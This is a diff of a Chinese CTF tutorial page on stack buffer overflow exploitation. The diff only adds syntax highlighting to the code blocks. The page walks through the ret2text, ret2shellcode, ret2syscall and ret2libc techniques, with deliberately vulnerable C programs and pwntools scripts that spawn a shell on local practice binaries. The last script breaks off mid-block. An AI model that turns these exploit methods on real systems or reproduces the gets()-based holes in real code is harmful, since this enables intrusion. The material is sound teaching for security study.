@@ -519,19 +519,20 @@
 <li>写入的数据大小没有被良好地控制。</li>
 </ul>
 <h2 id="基本示例"><a href="#基本示例" class="headerlink" title="基本示例"></a>基本示例</h2><p>最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，<strong>当然需要确保这个地址所在的段具有可执行权限</strong>。下面，我们举一个简单的例子：</p>
-<pre><code>#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
-void success() { puts("You Hava already controlled it."); }
-void vulnerable() {
-  char s[12];
-  gets(s);
-  puts(s);
-  return;
-}
-int main(int argc, char **argv) {
-  vulnerable();
-  return 0;
-}</code></pre><p>这个程序的主要目的读取一个字符串，并将其输出。<strong>我们希望可以控制程序执行 success 函数。</strong></p>
+<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token keyword">void</span> <span class="token function">success</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You Hava already controlled it."</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
+<span class="token keyword">void</span> <span class="token function">vulnerable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token function">gets</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token function">vulnerable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这个程序的主要目的读取一个字符串，并将其输出。<strong>我们希望可以控制程序执行 success 函数。</strong></p>
 <p>我们利用如下命令对其进行编译</p>
 <pre><code>➜  stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example 
 stack_example.c: In function ‘vulnerable’:
@@ -559,13 +560,14 @@ stack_example.c:(.text+0x27): 警告： the `gets' function is dangerous and sho
 <p>我们可以使用<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>关闭 Linux 系统的 ASLR，类似的，也可以配置相应的参数。</p>
 <p>为了降低后续漏洞利用复杂度，我们这里关闭 ASLR，在编译时关闭 PIE。当然读者也可以尝试 ASLR、PIE 开关的不同组合，配合 IDA 及其动态调试功能观察程序地址变化情况（在 ASLR 关闭、PIE 开启时也可以攻击成功）。</p>
 <p>确认栈溢出和 PIE 保护关闭后，我们利用 IDA 来反编译一下二进制程序并查看 vulnerable 函数 。可以看到</p>
-<pre><code>int vulnerable()
-{
-  char s; // [sp+4h] [bp-14h]@1
+<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">vulnerable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+4h] [bp-14h]@1</span>
 
-  gets(&amp;s);
-  return puts(&amp;s);
-}</code></pre><p>该字符串距离 ebp 的长度为 0x14，那么相应的栈结构为</p>
+  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>该字符串距离 ebp 的长度为 0x14，那么相应的栈结构为</p>
 <pre><code>                                           +-----------------+
                                            |     retaddr     |
                                            +-----------------+
@@ -604,18 +606,19 @@ stack_example.c:(.text+0x27): 警告： the `gets' function is dangerous and sho
                                            |                 |
                               s,ebp-0x14--&gt;+-----------------+</code></pre><p>但是需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 0x0804843B 在内存中的形式是</p>
 <pre><code>\x3b\x84\x04\x08</code></pre><p>但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \，x 等也算一个单独的字符。。所以我们需要想办法将 \x3b 作为一个字符输入进去。那么此时我们就需要使用一波 pwntools 了 (关于如何安装以及基本用法，请自行 github)，这里利用 pwntools 的代码如下：</p>
-<pre><code>##coding=utf8
-from pwn import *
-## 构造与程序交互的对象
-sh = process('./stack_example')
-success_addr = 0x0804843b
-## 构造payload
-payload = 'a' * 0x14 + 'bbbb' + p32(success_addr)
-print p32(success_addr)
-## 向程序发送字符串
-sh.sendline(payload)
-## 将代码交互转换为手工交互
-sh.interactive()</code></pre><p>执行一波代码，可以得到</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">##coding=utf8</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token comment" spellcheck="true">## 构造与程序交互的对象</span>
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./stack_example'</span><span class="token punctuation">)</span>
+success_addr <span class="token operator">=</span> <span class="token number">0x0804843b</span>
+<span class="token comment" spellcheck="true">## 构造payload</span>
+payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x14</span> <span class="token operator">+</span> <span class="token string">'bbbb'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>success_addr<span class="token punctuation">)</span>
+<span class="token keyword">print</span> p32<span class="token punctuation">(</span>success_addr<span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">## 向程序发送字符串</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">## 将代码交互转换为手工交互</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>执行一波代码，可以得到</p>
 <pre><code>➜  stack-example python exp.py
 [+] Starting local process './stack_example': pid 61936
 ;\x84\x0
@@ -677,17 +680,18 @@ $
     Stack:    No canary found
     NX:       NX enabled
     PIE:      No PIE (0x8048000)</code></pre><p>可以看出程序是 32 位程序，其仅仅开启了栈不可执行保护。然后，我们使用 IDA 来查看源代码。</p>
-<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
-{
-  int v4; // [sp+1Ch] [bp-64h]@1
+<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+1Ch] [bp-64h]@1</span>
 
-  setvbuf(stdout, 0, 2, 0);
-  setvbuf(_bss_start, 0, 1, 0);
-  puts("There is something amazing here, do you know anything?");
-  gets((char *)&amp;v4);
-  printf("Maybe I will tell you next time !");
-  return 0;
-}</code></pre><p>可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞。此后又发现</p>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"There is something amazing here, do you know anything?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Maybe I will tell you next time !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞。此后又发现</p>
 <pre><code>.text:080485FD secure          proc near
 .text:080485FD
 .text:080485FD input           = dword ptr -10h
@@ -738,13 +742,14 @@ $eip   : 0x080486ae  →  &lt;main+102&gt; call 0x8048460 &lt;gets@plt&gt;</code
 <li>s 相对于返回地址的偏移为 0x6c+4</li>
 </ul>
 <p>最后的 payload 如下：</p>
-<pre><code>##!/usr/bin/env python
-from pwn import *
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">##!/usr/bin/env python</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 
-sh = process('./ret2text')
-target = 0x804863a
-sh.sendline('A' * (0x6c+4) + p32(target))
-sh.interactive()</code></pre><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码</strong>。</p>
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2text'</span><span class="token punctuation">)</span>
+target <span class="token operator">=</span> <span class="token number">0x804863a</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x6c</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码</strong>。</p>
 <p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p>
 <h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><p>这里我们以 bamboofox 中的 ret2shellcode 为例</p>
 <p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode" target="_blank" rel="noopener">ret2shellcode</a></p>
@@ -756,18 +761,19 @@ sh.interactive()</code></pre><h2 id="ret2shellcode"><a href="#ret2shellcode" cla
     NX:       NX disabled
     PIE:      No PIE (0x8048000)
     RWX:      Has RWX segments</code></pre><p>可以看出源程序几乎没有开启任何保护，并且有可读，可写，可执行段。我们再使用 IDA 看一下程序</p>
-<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
-{
-  int v4; // [sp+1Ch] [bp-64h]@1
+<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+1Ch] [bp-64h]@1</span>
 
-  setvbuf(stdout, 0, 2, 0);
-  setvbuf(stdin, 0, 1, 0);
-  puts("No system for you this time !!!");
-  gets((char *)&amp;v4);
-  strncpy(buf2, (const char *)&amp;v4, 0x64u);
-  printf("bye bye ~");
-  return 0;
-}</code></pre><p>可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段。</p>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"No system for you this time !!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">strncpy</span><span class="token punctuation">(</span>buf2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v4<span class="token punctuation">,</span> <span class="token number">0x64u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bye bye ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段。</p>
 <pre><code>.bss:0804A080                 public buf2
 .bss:0804A080 ; char buf2[100]</code></pre><p>这时，我们简单的调试下程序，看看这一个 bss 段是否可执行。</p>
 <pre><code>gef➤  b main
@@ -806,15 +812,16 @@ Start      End        Offset     Perm Path
 0xfffdd000 0xffffe000 0x00000000 rwx [stack]</code></pre><p>通过 vmmap，我们可以看到 bss 段对应的段具有可执行权限</p>
 <pre><code>0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode</code></pre><p>那么这次我们就控制程序执行 shellcode，也就是读入 shellcode，然后控制程序执行 bss 段处的 shellcode。其中，相应的偏移计算类似于 ret2text 中的例子。</p>
 <p>具体的 payload 如下</p>
-<pre><code>#!/usr/bin/env python
-from pwn import *
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 
-sh = process('./ret2shellcode')
-shellcode = asm(shellcraft.sh())
-buf2_addr = 0x804a080
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2shellcode'</span><span class="token punctuation">)</span>
+shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+buf2_addr <span class="token operator">=</span> <span class="token number">0x804a080</span>
 
-sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))
-sh.interactive()</code></pre><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>ret2syscall，即控制程序执行系统调用，获取 shell。</p>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>buf2_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>ret2syscall，即控制程序执行系统调用，获取 shell。</p>
 <h3 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h3><p>这里我们以 bamboofox 中的 ret2syscall 为例</p>
 <p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop" target="_blank" rel="noopener">ret2syscall</a></p>
 <p>首先检测程序开启的保护</p>
@@ -824,17 +831,18 @@ sh.interactive()</code></pre><h2 id="ret2syscall"><a href="#ret2syscall" class="
     Stack:    No canary found
     NX:       NX enabled
     PIE:      No PIE (0x8048000)</code></pre><p>可以看出，源程序为 32 位，开启了 NX 保护。接下来利用 IDA 来查看源码</p>
-<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
-{
-  int v4; // [sp+1Ch] [bp-64h]@1
+<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+1Ch] [bp-64h]@1</span>
 
-  setvbuf(stdout, 0, 2, 0);
-  setvbuf(stdin, 0, 1, 0);
-  puts("This time, no system() and NO SHELLCODE!!!");
-  puts("What do you plan to do?");
-  gets(&amp;v4);
-  return 0;
-}</code></pre><p>可以看出此次仍然是一个栈溢出。类似于之前的做法，我们可以获得 v4 相对于 ebp 的偏移为 108。所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。关于系统调用的知识，请参考</p>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"This time, no system() and NO SHELLCODE!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What do you plan to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>可以看出此次仍然是一个栈溢出。类似于之前的做法，我们可以获得 v4 相对于 ebp 的偏移为 108。所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。关于系统调用的知识，请参考</p>
 <ul>
 <li><a href="https://zh.wikipedia.org/wiki/系统调用" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8</a></li>
 </ul>
@@ -899,19 +907,20 @@ Gadgets information
 
 Unique gadgets found: 4</code></pre><p>同时，也找到对应的地址了。</p>
 <p>下面就是对应的 payload，其中 0xb 为 execve 对应的系统调用号。</p>
-<pre><code>#!/usr/bin/env python
-from pwn import *
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 
-sh = process('./rop')
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./rop'</span><span class="token punctuation">)</span>
 
-pop_eax_ret = 0x080bb196
-pop_edx_ecx_ebx_ret = 0x0806eb90
-int_0x80 = 0x08049421
-binsh = 0x80be408
-payload = flat(
-    ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
-sh.sendline(payload)
-sh.interactive()</code></pre><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p>
+pop_eax_ret <span class="token operator">=</span> <span class="token number">0x080bb196</span>
+pop_edx_ecx_ebx_ret <span class="token operator">=</span> <span class="token number">0x0806eb90</span>
+int_0x80 <span class="token operator">=</span> <span class="token number">0x08049421</span>
+binsh <span class="token operator">=</span> <span class="token number">0x80be408</span>
+payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>
+    <span class="token punctuation">[</span><span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">112</span><span class="token punctuation">,</span> pop_eax_ret<span class="token punctuation">,</span> <span class="token number">0xb</span><span class="token punctuation">,</span> pop_edx_ecx_ebx_ret<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> binsh<span class="token punctuation">,</span> int_0x80<span class="token punctuation">]</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p>
 <h3 id="例子-3"><a href="#例子-3" class="headerlink" title="例子"></a>例子</h3><p>我们由简单到难分别给出三个例子。</p>
 <h4 id="例-1"><a href="#例-1" class="headerlink" title="例 1"></a>例 1</h4><p>这里我们以 bamboofox 中 ret2libc1 为例</p>
 <p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1" target="_blank" rel="noopener">ret2libc1</a></p>
@@ -922,50 +931,53 @@ sh.interactive()</code></pre><h2 id="ret2libc"><a href="#ret2libc" class="header
     Stack:    No canary found
     NX:       NX enabled
     PIE:      No PIE (0x8048000)</code></pre><p>源程序为 32 位，开启了 NX 保护。下面来看一下程序源代码，确定漏洞位置</p>
-<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
-{
-  int v4; // [sp+1Ch] [bp-64h]@1
+<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+1Ch] [bp-64h]@1</span>
 
-  setvbuf(stdout, 0, 2, 0);
-  setvbuf(_bss_start, 0, 1, 0);
-  puts("RET2LIBC &gt;_&lt;");
-  gets((char *)&amp;v4);
-  return 0;
-}</code></pre><p>可以看到在执行 gets 函数的时候出现了栈溢出。此外，利用 ropgadget，我们可以查看是否有 /bin/sh 存在</p>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"RET2LIBC >_&lt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>可以看到在执行 gets 函数的时候出现了栈溢出。此外，利用 ropgadget，我们可以查看是否有 /bin/sh 存在</p>
 <pre><code>➜  ret2libc1 ROPgadget --binary ret2libc1 --string '/bin/sh'          
 Strings information
 ============================================================
 0x08048720 : /bin/sh</code></pre><p>确实存在，再次查找一下是否有 system 函数存在。经在 ida 中查找，确实也存在。</p>
 <pre><code>.plt:08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]</code></pre><p>那么，我们直接返回该处，即执行 system 函数。相应的 payload 如下</p>
-<pre><code>#!/usr/bin/env python
-from pwn import *
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 
-sh = process('./ret2libc1')
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2libc1'</span><span class="token punctuation">)</span>
 
-binsh_addr = 0x8048720
-system_plt = 0x08048460
-payload = flat(['a' * 112, system_plt, 'b' * 4, binsh_addr])
-sh.sendline(payload)
+binsh_addr <span class="token operator">=</span> <span class="token number">0x8048720</span>
+system_plt <span class="token operator">=</span> <span class="token number">0x08048460</span>
